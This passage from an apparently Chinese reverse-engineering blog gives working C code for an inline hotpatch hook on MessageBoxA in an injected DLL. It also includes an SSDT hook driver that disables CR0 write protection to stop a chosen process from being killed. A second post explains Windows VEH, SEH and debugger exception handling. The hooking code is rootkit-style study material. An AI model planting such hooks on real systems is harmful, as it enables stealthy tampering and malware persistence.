class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载静态链接库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"><span class="function">ofstream <span class="title">ofs</span><span class="params">(<span class="string">&quot;hack.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*FnMessageBoxA)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT    uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">FnMessageBoxA pfnOld = <span class="literal">nullptr</span>;</span><br><span class="line">FnMessageBoxA realFn = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">pfnNew</span><span class="params">(HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT    uType)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">hotfixHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD64 dwAddress;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Start&quot;</span>, <span class="string">&quot;Hook start!!&quot;</span>, MB_OK);</span><br><span class="line">    pfnOld = (FnMessageBoxA)GetProcAddress(GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>),<span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    realFn = (FnMessageBoxA)((DWORD64)pfnOld + <span class="number">2</span>);</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>,<span class="number">0</span>, &#125;;</span><br><span class="line">    BYTE pBuf2[<span class="number">2</span>] = &#123; <span class="number">0xEB</span>,<span class="number">0xF9</span> &#125;;</span><br><span class="line"></span><br><span class="line">    pByte = (PBYTE)pfnOld;</span><br><span class="line">    <span class="keyword">if</span> (pByte[<span class="number">0</span>] == <span class="number">0xEB</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    VirtualProtect((LPVOID)((DWORD64)pfnOld - <span class="number">5</span>), <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 计算目标地址</span></span><br><span class="line">    dwAddress = (DWORD)pfnNew - (DWORD)pfnOld;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// hook</span></span><br><span class="line">    <span class="built_in">memcpy</span>((LPVOID)((DWORD)pfnOld - <span class="number">5</span>), pBuf, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOld, pBuf2, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 改回内存属性</span></span><br><span class="line">    VirtualProtect((LPVOID)((DWORD64)pfnOld - <span class="number">5</span>), <span class="number">7</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">pfnNew</span><span class="params">(HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT    uType)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    ofs &lt;&lt; <span class="string">&quot;Your infomation is mine!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    BOOL result=FALSE;</span><br><span class="line">    <span class="keyword">if</span> (pfnOld != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        realFn(hWnd,lpText,lpCaption,uType);<span class="comment">//调用以前的</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        hotfixHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        ofs.close();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并不是所有都适用，如果没有7字节，只能用5字节修改技术。</p>
<h2 id="SSDT-Hook"><a href="#SSDT-Hook" class="headerlink" title="SSDT Hook"></a>SSDT Hook</h2><p>用户层API最后的实质也是内核层API(Kernel32-&gt;Ntdll-&gt;Ntoskrnl)</p>
<p>该Hook方法最为强大</p>
<p>内核通过SSDT(System Device Descriptor Table)调用各种函数，SSDT是一个函数表，得到一个索引值，就能根据这个索引值在该表中得到想要的地址。</p>
<p>先找到SSDT的首地址，然后就可以根据索引，找到相应的函数</p>
<p>找索引号</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u nt!函数名</span><br></pre></td></tr></table></figure>
<p>根据反汇编结果找到索引号</p>
<p>内核Hook步骤</p>
<ol>
<li><p>修改内存属性为RWX</p>
</li>
<li><p>拼接汇编代码jmp [Hook Func]</p>
</li>
<li><p>保存源代码头5个字节</p>
</li>
<li><p>将头5个字节替换为2的汇编码</p>
</li>
<li><p>恢复前5字节</p>
</li>
<li><p>恢复内存属性</p>
</li>
</ol>
<p>由于内核层hook需要有权限，所以使用驱动方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内核之SSDT-HOOK</span></span><br><span class="line"><span class="comment">//系统服务表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG ServiceTableBase;       <span class="comment">//函数地址表的首地址</span></span><br><span class="line">    PULONG ServiceCounterTableBase;<span class="comment">//函数表中每个函数被调用的次数</span></span><br><span class="line">    ULONG  NumberOfService;        <span class="comment">//服务函数的个数</span></span><br><span class="line">    ULONG ParamTableBase;          <span class="comment">//参数个数表首地址</span></span><br><span class="line">&#125;KSYSTEM_SERVICE_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务描述符</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE ntoskrnl;<span class="comment">//ntoskrnl.exe的服务函数,SSDT</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE win32k;  <span class="comment">//win32k.sys的服务函数,ShadowSSDT</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE notUsed1;<span class="comment">//暂时没用1</span></span><br><span class="line">    KSYSTEM_SERVICE_TABLE notUsed2;<span class="comment">//暂时没用2</span></span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义HOOK的函数的类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI*FuZwOpenProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ PHANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ PCLIENT_ID ClientId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自写的函数声明</span></span><br><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">MyZwOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ PHANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ PCLIENT_ID ClientId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//记录系统的该函数</span></span><br><span class="line">FuZwOpenProcess g_OldZwOpenProcess;</span><br><span class="line"><span class="comment">//服务描述符表指针</span></span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR* g_pServiceTable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//要保护进程的ID</span></span><br><span class="line">ULONG g_Pid = <span class="number">9527</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//关闭页写入保护</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShutPageProtect</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//开启页写入保护</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OpenPageProtect</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载驱动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutLoad</span><span class="params">(DRIVER_OBJECT* obj)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////***驱动入口主函数***/</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(DRIVER_OBJECT* driver, UNICODE_STRING* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    path;</span><br><span class="line">    KdPrint((<span class="string">&quot;驱动启动成功！\n&quot;</span>));</span><br><span class="line">    <span class="comment">//DbgBreakPoint();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//安装钩子</span></span><br><span class="line">    InstallHook();</span><br><span class="line"></span><br><span class="line">    driver-&gt;DriverUnload = OutLoad;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载驱动</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutLoad</span><span class="params">(DRIVER_OBJECT* obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj;</span><br><span class="line">    <span class="comment">//卸载钩子</span></span><br><span class="line">    UninstallHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1.获取KTHREAD</span></span><br><span class="line">    PETHREAD pNowThread = PsGetCurrentThread();</span><br><span class="line">    <span class="comment">//2.获取ServiceTable表</span></span><br><span class="line">    g_pServiceTable = (KSERVICE_TABLE_DESCRIPTOR*)</span><br><span class="line">        (*(ULONG*)((ULONG)pNowThread + <span class="number">0xbc</span>));</span><br><span class="line">    <span class="comment">//3.保存旧的函数</span></span><br><span class="line">    g_OldZwOpenProcess = (FuZwOpenProcess)</span><br><span class="line">        g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0xbe</span>];</span><br><span class="line">    <span class="comment">//4.关闭页只读保护</span></span><br><span class="line">    ShutPageProtect();</span><br><span class="line">    <span class="comment">//5.写入自己的函数到SSDT表内</span></span><br><span class="line">    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0xbe</span>]</span><br><span class="line">        = (ULONG)MyZwOpenProcess;</span><br><span class="line">    <span class="comment">//6.开启页只读保护</span></span><br><span class="line">    OpenPageProtect();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//1.关闭页只读保护</span></span><br><span class="line">    ShutPageProtect();</span><br><span class="line">    <span class="comment">//2.写入原来的函数到SSDT表内</span></span><br><span class="line">    g_pServiceTable-&gt;ntoskrnl.ServiceTableBase[<span class="number">0xbe</span>]</span><br><span class="line">        = (ULONG)g_OldZwOpenProcess;</span><br><span class="line">    <span class="comment">//3.开启页只读保护</span></span><br><span class="line">    OpenPageProtect();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭页只读保护</span></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) ShutPageProtect()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push eax;</span><br><span class="line">        mov eax, cr0;</span><br><span class="line">        <span class="keyword">and</span> eax, ~<span class="number">0x10000</span>;</span><br><span class="line">        mov cr0, eax;</span><br><span class="line">        pop eax;</span><br><span class="line">        ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启页只读保护</span></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) OpenPageProtect()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push eax;</span><br><span class="line">        mov eax, cr0;</span><br><span class="line">        <span class="keyword">or</span> eax, <span class="number">0x10000</span>;</span><br><span class="line">        mov cr0, eax;</span><br><span class="line">        pop eax;</span><br><span class="line">        ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自写的函数</span></span><br><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">MyZwOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ PHANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ PCLIENT_ID ClientId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//当此进程为要保护的进程时</span></span><br><span class="line">    <span class="keyword">if</span> (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid &amp;&amp;</span><br><span class="line">        DesiredAccess == PROCESS_TERMINATE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//设为拒绝访问</span></span><br><span class="line">        DesiredAccess = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用原函数</span></span><br><span class="line">    <span class="keyword">return</span> g_OldZwOpenProcess(</span><br><span class="line">        ProcessHandle,</span><br><span class="line">        DesiredAccess,</span><br><span class="line">        ObjectAttributes,</span><br><span class="line">        ClientId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/Childe_Mu/article/details/79196103">HOOK实例之一：实现键盘钩子截获密码等键盘输入（vs2013详细流程）_Childe_Mu的博客-CSDN博客</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winmsg/about-hooks">Hooks Overview - Win32 apps | Microsoft Docs</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://blog.csdn.net/Simon798/article/details/98848050">C++ Hook 键盘记录器_LYSM-CSDN博客</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://blog.csdn.net/o_ohello/article/details/92846842">c++ 遍历获取所有进程名及PID_o_ohello的博客-CSDN博客</a></p>
<p>[5] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/iBinary/p/10975839.html">IAT Hook - iBinary - 博客园</a></p>
<p>[6] <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-250832.htm">[原创]SSDT-HOOK—看雪</a></p>
<p>[7] <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37552052/article/details/81453591">Windows Hook原理与实现_安全杂货铺-CSDN博客</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/win-ehs" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/28/note/rev/win-ehs/" class="article-date">
  	<time datetime="2020-10-28T00:35:26.000Z" itemprop="datePublished">2020-10-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/28/note/rev/win-ehs/">
        windows异常处理机制
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul>
<li><p>SEH：结构化异常处理</p>
</li>
<li><p>VEH向量化异常处理</p>
</li>
<li><p>TopLevelEH顶层异常处理</p>
</li>
</ul>
<p>每种处理方法都可以三种值，在不同处理方法下意义不同</p>
<ul>
<li><p>EXCEPTION_EXECUTE_HANDLER</p>
<p>该异常被处理，从异常处下一条指令开始执行</p>
</li>
<li><p>EXCEPTION_CONTINUE_SEARCH</p>
<p>不处理该异常</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTIOIN</p>
<p>忽略异常，从异常处继续执行</p>
</li>
</ul>
<p>如果当前进程正在被调试，调试器也可以返回值</p>
<ul>
<li><p>DBG_CONTINUE</p>
<p>等同于EXCEPTION_CONTINUE_EXECUTION</p>
</li>
<li><p>DBG_EXCEPTION_NOT_HANDLED</p>
<p>等同于EXCEPTION_CONTINUE_SEARCH</p>
</li>
</ul>
<p>异常处理器包含内核异常处理和R3异常处理</p>
<h2 id="R3程序产生异常时，异常处理器处理顺序："><a href="#R3程序产生异常时，异常处理器处理顺序：" class="headerlink" title="R3程序产生异常时，异常处理器处理顺序："></a>R3程序产生异常时，异常处理器处理顺序：</h2><ol>
<li><p>交给调试器</p>
</li>
<li><p>执行VEH</p>
</li>
<li><p>执行SEH</p>
</li>
<li><p>TopLevelEH</p>
</li>
<li><p>交给调试器</p>
</li>
<li><p>调试异常端口通知csrss.exe</p>
</li>
</ol>
<h3 id="第一次交给调试器"><a href="#第一次交给调试器" class="headerlink" title="第一次交给调试器"></a>第一次交给调试器</h3><p>判断是否处理该异常</p>
<ul>
<li><p>处理返回DBG_CONTINUE</p>
</li>
<li><p>否则返回DBG_EXECUTE_NOT_HANDLED</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(!bExit)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;</span><br><span class="line">    DEBUG_EVENT debugEvent;</span><br><span class="line">    WaitForDebugEvent(&amp;debugEvent, INFINITE);</span><br><span class="line">    <span class="keyword">switch</span> ( debugEvent.dwDebugEventCode )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line">        &#123;</span><br><span class="line">            EXCEPTION_DEBUG_INFO* pExcpInfo = &amp;debugEvent.u.Exception;</span><br><span class="line">            <span class="keyword">if</span> ( MessageBox(<span class="number">0</span>,_T(<span class="string">&quot;处理该异常?&quot;</span>), _T(<span class="string">&quot;我是调试器&quot;</span>),MB_YESNO)==IDYES )</span><br><span class="line">            &#123;</span><br><span class="line">                dwContinueStatus = DBG_CONTINUE;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    ContinueDebugEvent(debugEvent.dwProcessId,  debugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="执行VEH"><a href="#执行VEH" class="headerlink" title="执行VEH"></a>执行VEH</h3><p>如果没有被调试，或者调试器不处理该异常(返回DBG_EXCEPTION_NOT_HANDLED)，就会把异常交给VEH</p>
<p>VEH是个链表，每个VEH按顺序调用</p>
<p>VEH在SEH之前执行，不依赖某一线程，返回值：</p>
<ul>
<li><p>EXCEPTION_CONTINUE_SEARCH 交给下一个VEH</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTION 认为已被处理，退出异常处理器在异常指令处继续执行</p>
</li>
<li><p>EXCEPTION_EXECUTE_HANDLED 无效，等同于EXCEPTION_CONTINUE_SEARCH</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG NTAPI <span class="title">FirstVectExcepHandler</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( ... )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//参数1=1表示插入Veh链的头部，=0表示插入到VEH链的尾部</span></span><br><span class="line">AddVectoredExceptionHandler( <span class="number">1</span>, &amp;FirstVectExcepHandler );</span><br></pre></td></tr></table></figure>
<h3 id="执行SEH"><a href="#执行SEH" class="headerlink" title="执行SEH"></a>执行SEH</h3><p>当所有的VEH都不处理该异常，该异常就会让SEH处理，SEH只能处理自己线程的异常，基于线程栈的异常处理机制</p>
